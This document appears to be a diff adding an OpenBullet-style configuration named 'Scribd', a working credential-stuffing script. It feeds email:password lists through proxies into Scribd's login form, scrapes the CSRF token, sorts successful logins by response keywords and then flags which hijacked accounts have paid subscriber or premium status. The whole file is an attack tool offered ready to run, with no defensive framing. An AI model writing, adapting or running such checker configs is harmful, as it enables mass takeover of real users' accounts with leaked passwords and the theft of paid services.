@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "Scribd",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-12T02:04:45.7620994+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_TOKEN_(GET) REQUEST GET "https://www.scribd.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_CSRFTOKEN PARSE "<SOURCE>" CSS "[name=csrf-token]" "content" 0 -> VAR "CSRFTOKEN" "" "" 
+#REQUEST_LOGIN_(POST) REQUEST POST "https://www.scribd.com/login" AutoRedirect=TRUE 
+  CONTENT "login_or_email=<USER>&login_password=<PASS>&rememberme=off" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Tried-CSRF: 1" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-CSRF-Token: <CSRFTOKEN>" 
+  HEADER "Referer: https://www.scribd.com/login" 
+  HEADER "Origin: https://www.scribd.com" 
+#KEY_FAIL KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "form_name\":null,\"errors" 
+  KEYCHAIN Success OR 
+    KEY "login\":true" 
+#REQUEST__PAGE_(GET) REQUEST GET "https://www.scribd.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.scribd.com/login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+#PARSE_data.is_subscriber PARSE "<SOURCE>" LR "Scribd.user_data.is_subscriber = " ";" Recursive=FALSE -> CAP "SUBSCRIBER" "" "" 
+#PARSE_data.is_pmp_ PARSE "<SOURCE>" LR "Scribd.user_data.is_pmp = " ";" Recursive=FALSE -> CAP "PMP" "" "" 
+#PARSE_ui_subscriber PARSE "<SOURCE>" LR "ui_subscriber: \"" "\"" Recursive=FALSE -> CAP "UI SUBSCRIBER" "" "" 
+#PREM_CHECK KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure AND 
+    KEY "'setData', ui_subscriber: \"false\"" 
+    KEY "Scribd.user_data.is_pmp = false;" 
+    KEY "Scribd.user_data.is_subscriber = false;" 
+  KEYCHAIN Success OR 
+    KEY "subscriber: \"true" 
+    KEY "subscriber = true" 
+    KEY "Scribd.user_data.is_pmp = true" 
